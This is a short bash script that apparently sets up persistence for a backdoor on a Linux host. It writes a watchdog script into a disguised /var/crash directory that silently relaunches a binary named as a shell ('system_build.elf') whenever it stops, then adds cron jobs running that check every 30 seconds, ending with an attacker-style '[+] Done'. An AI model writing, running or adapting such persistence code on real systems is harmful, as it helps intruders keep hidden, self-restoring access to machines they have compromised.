#!/bin/bash

SHELL_PATH="/var/crash/crask/system_build.elf"
CHECK_SCRIPT="/var/crash/crask/checksys.sh"

cat <<EOF > "$CHECK_SCRIPT"
#!/bin/bash
if ! pgrep -f "$SHELL_PATH" > /dev/null; then
  nohup $SHELL_PATH > /dev/null 2>&1 &
fi
EOF

chmod +x "$CHECK_SCRIPT"

( crontab -l 2>/dev/null; echo "*/1 * * * * $CHECK_SCRIPT"; echo "*/1 * * * * sleep 30; $CHECK_SCRIPT" ) | crontab -

echo "[+] Done"
